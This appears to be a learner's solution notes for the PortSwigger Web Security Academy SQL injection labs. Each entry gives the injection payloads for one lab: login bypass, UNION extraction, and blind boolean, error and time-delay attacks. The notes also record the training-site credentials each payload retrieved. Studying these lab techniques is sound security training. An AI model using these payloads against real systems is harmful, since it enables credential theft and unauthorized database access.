
# **[Web Security Academy][web_security_academy]**

## **Level Notes** <sub><sup><sub>by [Psycho][author's_twitter]</sub></sup></sub>

### **Web Security**

> “The Web Security Academy is a free online training center for web application security.  
> It includes content from PortSwigger's in-house research team, experienced academics,  
> and our Chief Swig Dafydd Stuttard - author of The Web Application Hacker's Handbook.
>
> Unlike a textbook, the Academy is constantly updated. It also includes interactive labs  
> where you can put what you learn to the test. If you want to improve your knowledge of hacking,  
> or you'd like to become a bug bounty hunter or pentester, you're in the right place.”

[Getting Started][wsa_getting_started]  
[Learning Path][wsa_learning_path]  
[All Labs][wsa_all_labs]

### **Burp Suite**

[Documetation][burp_desktop]  
[Video Tutorials][burp_video_tutorials]

[web_security_academy]: https://portswigger.net/web-security
[author's_twitter]:     https://www.twitter.com/UDPsycho
[wsa_getting_started]:  https://portswigger.net/web-security/getting-started
[wsa_learning_path]:    https://portswigger.net/web-security/learning-path
[wsa_all_labs]:         https://portswigger.net/web-security/all-labs
[burp_desktop]:         https://portswigger.net/burp/documentation/desktop
[burp_video_tutorials]: https://portswigger.net/burp/pro/video-tutorials

<br>

# Server-Side Topics

## **SQL Injection**

### [SQLi cheat sheet][sqli_cheat_sheet]

### [Retrieving hidden data][sqli_retrieving_hidden_data]

1. #### **SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

    ```sql
    Pets
    Pets'
    Pets'+AND+1=1--+
    Pets'+AND+1=0--+
    Pets'+OR+1=1--+
    ```

### [Subverting application logic][sqli_subverting_application_logic]

2. #### **SQL injection vulnerability allowing login bypass**

    ```sql
    administrator'--+
    letmein
    ```

### [SQL injection UNION attacks][sqli_union_attacks]

3. #### **SQL injection UNION attack, determining the number of columns returned by the query**

    ```sql
    Lifestyle
    Lifestyle'
    Lifestyle'+ORDER+BY+10--+
    Lifestyle'+ORDER+BY+5--+
    Lifestyle'+ORDER+BY+3--+
    Lifestyle'+UNION+SELECT+null,null,null--+
    ```

4. #### **SQL injection UNION attack, finding a column containing text**

    ```sql
    Tech+gifts
    Tech+gifts'
    Tech+gifts'+ORDER+BY+10--+
    ...
    Tech+gifts'+ORDER+BY+3--+
    Tech+gifts'+UNION+SELECT+null,null,null--+
    Tech+gifts'+UNION+SELECT+'a',null,null--+
    Tech+gifts'+UNION+SELECT+null,'a',null--+
    Tech+gifts'+UNION+SELECT+null,null,'a'--+
    Tech+gifts'+UNION+SELECT+null,'<payload>',null--+
    ```

5. #### **SQL injection UNION attack, retrieving data from other tables**

    ```sql
    Food+&+Drink
    Food+%26+Drink'
    Food+%26+Drink'+ORDER+BY+10--+
    ...
    Food+%26+Drink'+ORDER+BY+2--+
    Food+%26+Drink'+UNION+SELECT+null,null--+
    Food+%26+Drink'+UNION+SELECT+'a',null--+
    Food+%26+Drink'+UNION+SELECT+null,'a'--+

    v1: Food+%26+Drink'+UNION+SELECT+username,password+FROM+users--+
    v2: '+UNION+SELECT+username,password+FROM+users--+

    administrator
    juzh2wn9ora63r6pxl8b
    carlos
    sedhheoi7cbd4320g53h
    wiener
    b8tr0redpjyjhk2usqte
    ```

6. #### **SQL injection UNION attack, retrieving multiple values in a single column [on PostgreSQL]**

    ```sql
    '
    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+2--+
    '+UNION+SELECT+null,null--+
    '+UNION+SELECT+null,'a'--+
    '+UNION+SELECT+null,@@version--+
    '+UNION+SELECT+null,version()--+
    '+UNION+SELECT+null,username||':'||password+FROM+users--+

    administrator:f6qbqbsagrrvalh8rlgn
    carlos:ga3cbtzle95cewsaiabd
    wiener:7ox6rd3ve2ghwdml6hh8  
    ```

### [Examining the database in SQL injection attacks][sqli_examining_the_database]

7. #### **SQL injection attack, querying the database type and version on Oracle**

    ```sql
    '
    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+2--+
    '+UNION+SELECT+null,null--+
    '+UNION+SELECT+null,null+FROM+dual--+
    '+UNION+SELECT+null,'a'+FROM+dual--+

    v1: '+UNION+SELECT+null,banner+FROM+v$version--+

    CORE 11.2.0.2.0 Production
    NLSRTL Version 11.2.0.2.0 - Production
    Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
    PL/SQL Release 11.2.0.2.0 - Production
    TNS for Linux: Version 11.2.0.2.0 - Production


    v2: '+UNION+SELECT+null,version+FROM+v$instance--+

    11.2.0.2.0
    ```

8. #### **SQL injection attack, querying the database type and version on MySQL and Microsoft**

    ```sql
    '
    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+2--+
    '+UNION+SELECT+null,null--+
    '+UNION+SELECT+null,'a'--+
    '+UNION+SELECT+null,@@version--+

    8.0.28
    ```

9. #### **SQL injection attack, listing the database contents on non-Oracle databases [on PostgreSQL]**

    ```sql
    '
    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+2--+
    '+UNION+SELECT+null,null--+
    '+UNION+SELECT+null,'a'--+
    '+UNION+SELECT+null,@@version--+
    '+UNION+SELECT+null,version()--+
    '+UNION+SELECT+null,table_name+FROM+information_schema.tables--+

    pg_extension
    ...
    pg_stat_ssl


    '+UNION+SELECT+null,column_name+FROM+information_schema.columns+WHERE+table_name='users_ofvjie'--+

    username_mlkloc
    password_sbcyoy


    '+UNION+SELECT+null,username_mlkloc||':'||password_sbcyoy+FROM+users_ofvjie--+

    ljucg64gbyb9im1d4qnr:administrator
    k4fnsu3ypxf6xhvdl6uo:wiener
    asqnndhx0duy8o6ihvcd:carlos
    ```

10. #### **SQL injection attack, listing the database contents on Oracle**

    ```sql
    '
    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+2--+
    '+UNION+SELECT+null,null--+
    '+UNION+SELECT+null,'a'--+
    '+UNION+SELECT+null,banner+FROM+v$version--+
    '+UNION+SELECT+null,table_name+FROM+all_tables--+

    ACCESS$
    ALERT_QT
    APEX$_ACL
    ...
    XSTREAM$_SUBSET_RULES
    XSTREAM$_SYSGEN_OBJS
    _default_auditing_options_


    '+UNION+SELECT+null,column_name+FROM+all_tab_columns+WHERE+table_name='USERS_SRDZXP'--+

    PASSWORD_PBSDQA
    USERNAME_UCSPNN


    '+UNION+SELECT+null,USERNAME_UCSPNN||':'||PASSWORD_PBSDQA +FROM+USERS_SRDZXP--+

    administrator:i7y3yvv6wwhncqh5ib3a
    carlos:i88mkudi5ib4e5h4pd76
    wiener:43zoumrp40l79jfp2n5h
    ```

### [Blind SQL injection][sqli_blind]

11. #### **Blind SQL injection with conditional responses**

    > 📝 **Note:**
    <mark>If like me you don't have Burp Suite Pro, you can use one of
    [these][sqli_script_conditional_responses] scripts to automate the last part of the attack.</mark>

    ```sql
                        (Content-Length: 2963, "Welcome" message appears)
    '                   (Content-Length: 2902, "Welcome" message DOESN'T appears)
    '+AND+'1'='1        (Content-Length: 2963, "Welcome" message appears)
    '+AND+'1'='0        (Content-Length: 2902, "Welcome" message DOESN'T appears)

    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+1--+

    '+AND+(SELECT '1')='1

    *** FALTA: Cómo sacar el total de tablas y su nombre. ***

    '+AND+(SELECT '1' FROM users LIMIT 1)='1

    *** FALTA: Cómo sacar el total de columnas de una tabla y su nombre. ***

    '+AND+(SELECT '1' FROM users WHERE username='administrator')='1

    '+AND+(SELECT '1' FROM users WHERE username = 'administrator' AND LENGTH(password)>10)='1
    ...
    '+AND+(SELECT '1' FROM users WHERE username = 'administrator' AND LENGTH(password)=20)='1


    '+AND+(SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator')='a
    ...
    '+AND+(SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator')='z

    ...

    '+AND+(SELECT SUBSTRING(password,20,1) FROM users WHERE username = 'administrator')='a
    ...
    '+AND+(SELECT SUBSTRING(password,20,1) FROM users WHERE username = 'administrator')='r

    z5ta0ialqfrn6upo5xlr
    ```

12. #### **Blind SQL injection with conditional errors**

    > 📝 **Note:**
    <mark>If like me you don't have Burp Suite Pro, you can use one of
    [these][sqli_script_conditional_errors] scripts to automate the last part of the attack.</mark>

    ```sql
                        (Content-Length: 2893, 200 OK)
    '                   (Content-Length: 2132, 500 Internat Server Error)

    '+AND+'1'='1        (Content-Length: 2893, 200 OK)
    '+AND+'1'='0        (Content-Length: 2893, 200 OK)
    '+AND+1=1--+        (Content-Length: 2893, 200 OK)
    '+AND+1=0--+        (Content-Length: 2893, 200 OK)
    '+AND+1='a'--+      (Content-Length: 2132, 500 Internat Server Error)

    ''                  (Content-Length: 2893, 200 OK)  
                        (With double quotes, the error disappears. This suggests that a syntax error  
                        [in this case, the unclosed quotation mark] is having a detectable effect on the response.)

    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+1--+

    '+UNION+SELECT+null--+
    v1: '+UNION+SELECT+null+FROM+dual--+
    v2: ' || (SELECT null FROM dual) || '

    v1: '+UNION+SELECT+null+FROM+users--+
    v2: ' || (SELECT null FROM users WHERE ROWNUM = 1) || '

    ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
    ' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '

    ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '

    ' || (SELECT CASE WHEN (LENGTH(password)>10) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
    ...
    ' || (SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '


    ' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
    ...
    ' || (SELECT CASE WHEN (SUBSTR(password,1,1)='8') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '

    ...

    ' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
    ...
    ' || (SELECT CASE WHEN (SUBSTR(password,20,1)='8') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '

    8knjfapro4g999hxxxn8
    ```

13. #### **Blind SQL injection with time delays**

    > 📝 **Note:**
    <mark>None of the previous techniques works because
    "the application now catches database errors and handles them gracefully.  
    Triggering a database error when the injected SQL query is executed
    no longer causes any difference in the application's response".</mark>

    ```sql
    v1.1:   ' || pg_sleep(5) || '
    v1.2:   ' || pg_sleep(5)--+
    v1.3:   ' || (SELECT pg_sleep(5)) || '

    v2:     '%3b+SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--+
    ```

14. #### **Blind SQL injection with time delays and information retrieval**

    > 📝 **Note:**
    <mark>None of the previous techniques works because
    "the application now catches database errors and handles them gracefully.  
    Triggering a database error when the injected SQL query is executed
    no longer causes any difference in the application's response".</mark>

    ```sql
    '%3b (SELECT pg_sleep(5))--+

    '%3b+(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--+
    '%3b+(SELECT CASE WHEN (1=0) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--+

    '%3b+(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--+

    '%3b+(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND length(password)>10)--+
    ...
    '%3b+(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND length(password)=20)--+


    '%3b+(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--+
    ...
    '%3b+(SELECT CASE WHEN (SUBSTR(password,1,1)='b') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--+

    ...

    '%3b+(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--+
    ...
    '%3b+(SELECT CASE WHEN (SUBSTR(password,20,1)='d') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--+

    be4o117s8qn0wuchy41d
    ```

15. #### **Blind SQL injection with out-of-band interaction**

    ```plaintext
    PENDING UNTIL I GET THE BURP SUITE PRO VERSION
    ```

16. #### **Blind SQL injection with out-of-band data exfiltration**

    ```plaintext
    PENDING UNTIL I GET THE BURP SUITE PRO VERSION
    ```

[sql_injection]:                     https://portswigger.net/web-security/sql-injection
[sqli_cheat_sheet]:                  https://portswigger.net/web-security/sql-injection/cheat-sheet
[sqli_retrieving_hidden_data]:       https://portswigger.net/web-security/sql-injection#retrieving-hidden-data
[sqli_subverting_application_logic]: https://portswigger.net/web-security/sql-injection#subverting-application-logic
[sqli_union_attacks]:                https://portswigger.net/web-security/sql-injection/union-attacks
[sqli_examining_the_database]:       https://portswigger.net/web-security/sql-injection/examining-the-database
[sqli_blind]:                        https://portswigger.net/web-security/sql-injection/blind
[sqli_script_conditional_responses]: https://github.com/UDPsycho/SecurityLabs/tree/main/Web%20Security%20Academy/Resources/SQL%20Injection/Blind%20SQL%20injection%20with%20conditional%20responses
[sqli_script_conditional_errors]:    https://github.com/UDPsycho/SecurityLabs/tree/main/Web%20Security%20Academy/Resources/SQL%20Injection/Blind%20SQL%20injection%20with%20conditional%20errors

---

<!--
## **Authentication**

## **Directory Traversal**

## **Command Injection**

## **Business Logic Vulnerabilities**

## **Information Disclosure**

## **Access Control**

## **File Upload Vulnerabilities**

## **Server-Side Request Forgery (SSRF)**

## **XXE Injection**

<br>

# Client-Side Topics

## **Cross-Site Scripting (XSS)**

## **Cross-Site Request Forgery (CSRF)**

## **Cross-Origin Resource Sharing (CORS)**

## **Clickjacking**

## **DOM-Based Vulnerabilities**

## **WebSockets**

<br>

# Advanced Topics

## **Insecure Deserialization**

## **Server-Side Template Injection**

## **Web Cache Poisoning**

## **HTTP Host Header Attacks**

## **HTTP Request Smuggling**

## **OAuth Authentication**

-->
